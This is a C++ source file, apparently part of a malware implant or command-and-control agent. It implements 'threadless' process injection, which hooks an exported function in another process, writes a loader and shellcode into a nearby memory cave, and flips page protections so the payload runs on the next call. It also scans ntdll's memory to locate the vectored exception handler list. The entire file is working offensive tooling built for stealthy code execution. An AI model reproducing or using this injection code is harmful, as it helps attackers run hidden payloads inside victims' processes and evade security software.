#include <core/include/inject.hpp>
#define CALL_X_OFFSET 0x1
#define EXPORT_OFFSET 0x12

namespace Injection {

    VOID Threadless(THREADLESS Threadless, LPVOID Shellcode, SIZE_T cbShellcode, SIZE_T cbFullSize) {
        HEXANE

        // todo: needs MmPivotRegion (Flower) :
        // Proper JIT: Allocate(RW) -> memcpy(code) -> Protect(RX) -> execute [-> Free]

        HANDLE process      = { };
        UINT_PTR ex_addr    = 0;
        UINT_PTR ex_addr_p  = 0;
        UINT_PTR hook       = 0;
        SIZE_T write        = 0;

        if (!(ex_addr = Memory::Modules::GetExportAddress(S_CAST(LPSTR, Threadless.Module.Buffer), R_CAST(LPSTR, Threadless.Export.Buffer))) ||
            !(process = Process::LdrGetParentHandle(R_CAST(PBYTE, Threadless.Parent.Buffer))) ||
            !(hook = Memory::Scanners::RelocateExport(process, R_CAST(LPVOID, ex_addr), cbShellcode))) {
            return;
        }

        auto loader_rva = hook - (ex_addr + 5);
        auto hook_p = hook;

        Memory::PatchMemory(B_PTR(&ex_addr_p), B_PTR(&ex_addr), 0, 0, sizeof(LPVOID));
        Memory::PatchMemory(B_PTR(Threadless.Loader.Buffer), B_PTR(&ex_addr_p), EXPORT_OFFSET, 0, sizeof(LPVOID));
        Memory::PatchMemory(B_PTR(Threadless.Opcode.Buffer), B_PTR(&loader_rva), CALL_X_OFFSET, 0, 4);

        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(PVOID*, &ex_addr_p), &cbFullSize, PAGE_EXECUTE_READWRITE, nullptr)) ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(PVOID, Threadless.Opcode.Buffer), Threadless.Opcode.Length, &write)) || write != Threadless.Opcode.Length) {
            return_defer(ntstatus);
        }
        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook_p), &cbFullSize, PAGE_READWRITE, nullptr)) ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook), Threadless.Loader.Buffer, Threadless.Loader.Length, &write)) || write != Threadless.Loader.Length) {
            return_defer(ntstatus);
        }

        //Xtea::XteaCrypt(R_CAST(PBYTE, Shellcode), cbShellcode, Ctx->Config.Key, FALSE);

        if (
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + Threadless.Loader.Length), Shellcode, cbShellcode, &write)) || write != cbShellcode ||
            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID*, &hook), &cbShellcode, PAGE_EXECUTE_READ, nullptr))) {
            return_defer(ntstatus);
        }

        defer:
        if (process) {
            Ctx->Nt.NtClose(process);
        }
    }

    namespace Veh {

        UINT_PTR VehGetFirstHandler(wchar_t *name, const char *signature, const char *mask) {
            HEXANE

            LdrpVectorHandlerList *handlers = { };
            uintptr_t handler = { };
            uint32_t match = 0;

            const auto ntdll = Memory::Modules::GetModuleEntry(Utils::GetHashFromStringW(name, x_wcslen(name)));
            if (!(match = Memory::Scanners::SignatureScan(R_CAST(uintptr_t, ntdll->DllBase), ntdll->SizeOfImage, signature, mask))) {
                return_defer(ERROR_INCORRECT_ADDRESS);
            }

            match += 0xD;
            handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t*, match + (match + 0x3) + 0x7));

            if (
                !NT_SUCCESS(Ctx->Nt.RtlFreeHeap(GetProcessHeap(), 0, ntdll)) ||
                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, handlers->First), &handler, sizeof(void *), nullptr))) {

                handler = 0;
                return_defer(ntstatus);
            }

            defer:
            return handler;
        }
    }
}
